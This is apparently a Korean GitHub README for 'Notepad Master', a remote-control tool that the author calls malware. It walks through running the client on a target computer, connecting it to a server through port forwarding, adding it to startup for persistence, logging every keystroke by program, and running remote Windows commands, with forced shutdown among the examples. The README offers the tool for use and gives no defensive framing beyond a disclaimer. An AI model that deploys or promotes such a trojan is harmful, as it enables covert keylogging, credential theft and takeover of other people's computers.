What is Notepad Master?
==========================
컴퓨터실 장난용 원격조종 툴로 시작했으나

지금은 악성코드로 진화했습니다.

악용시 책임은 당사자가 집니다.

Usage
==========================

Setup
----------------------

![클라이언트 실행창](https://user-images.githubusercontent.com/67177785/188458621-2fb6212e-fe12-4431-8809-593f60950140.PNG)  
**[그림1] 클라이언트 실행창**

조종 타겟 컴퓨터에서 NotepadMaster_2.1.0.zip을 다운받아 NotepadMasterClient.exe를 실행합니다

먼저 접속할 서버의 IP를 정해 봅시다

![내부망 IP확인](https://user-images.githubusercontent.com/67177785/188458650-19f2e6df-b511-410f-b8b1-0012b995fbfc.PNG)  
**[그림2] 내부망 IP확인**

내부망에서 접속할 경우는(쉽게 말해 같은 와이파이를 쓰는 경우 등) cmd에 ipconfig를 쳐서 나오는 주소를 입력하면 됩니다

외부망이면.. 사용하는 공유기에서 포트포워딩 설정을 따로 해줘야합니다

![LG U+ 공유기 설정 페이지](https://user-images.githubusercontent.com/67177785/188460770-28001432-a756-4909-8efe-78743f995dbb.PNG)
**[그림3] LG U+ 공유기 설정 페이지**

통신사마다 설정방법이 조금씩 차이가 나지만 일반적으로 공유기 설정 페이지에 들어가 관리자 계정으로 로그인 후 설정할 수 있습니다

서버쪽 공유기에서 44401번 포트를 열고 클라이언트에는 공유기의 IP(네이버에서 '내 아이피'를 검색했을때 나오는 주소)를 입력합시다

다음으로 윈도우의 시작프로그램에 등록할 지 말지 여부를 묻는 부분이 나옵니다

y또는 n을 입력합니다

관리자 권한으로 실행해야 쓸 수 있는 기능입니다

![클라이언트 접속 확인](https://user-images.githubusercontent.com/67177785/188458759-82e23583-14c0-4ff6-94c7-739688aba460.PNG)  
**[그림4] 클라이언트 접속 확인**

이후 접속자의 정보들을 리스트에서 확인 할 수 있습니다

리스트에 올라있는 클라이언트의 번호를 더블클릭해 원격 조종 창을 띄울 수 있습니다

Keylog
----------------------

![키로깅 확인](https://user-images.githubusercontent.com/67177785/188458781-3536b79a-50cf-4651-a20b-6353ee96b9e7.gif)  
**[그림5] 키로깅 확인**

조종 타겟이 키보드를 누를 때마다 입력 정보를 전송합니다(키로깅).

키로그를 키가 입력된 프로세스로 구분해 어떤 프로그램에 키가 입력되었는지 알 수 있고

한글 / 영어 둘 다 지원합니다

키로그 모두 저장 버튼으로 받은 키로그들을 저장합니다.

Send Message
----------------------

![메시지 전송 예시](https://user-images.githubusercontent.com/67177785/188458806-006505b2-9cd6-452a-999d-9050e3a3a41c.gif)  
**[그림6] 메시지 전송 예시**

메모장을 통해 타겟에게 일방적으로 메시지를 전달합니다.

메시지 입력창 위쪽에서 폰트를 바꿀 수 있습니다.

딜레이 값을 통해 글자 입력 속도를 조절합니다.

글자 크기는 21, 딜레이는 120이 기본 값입니다.

Remote Control
---------------------

![커맨드 입력 예시](https://user-images.githubusercontent.com/67177785/188458834-6caa6be6-a38c-422b-b619-06c2a2cc9a69.gif)  
**[그림7] 커맨드 입력 예시**

CMD 옵션을 선택해 타겟 컴퓨터에 원격으로 윈도우 커맨드를 입력할 수 있습니다

아래는 유용하게 쓸 수 있는 커맨드 입력 예시입니다.

```
start chrome youtube.com // 유튜브 틀어주기
taskkill /f /im notepad.exe // 메모장 강제종료
shutdown -s // 시스템 강제종료
```

Build Settings
==========================

### IDE
- Visual Studio 2017

### Framework
- MFC

License
==========================
This project is licensed under the terms of GPL-3.0 License.

Icon License : <a href='https://pngtree.com/so/puppet'>puppet png from pngtree.com/</a>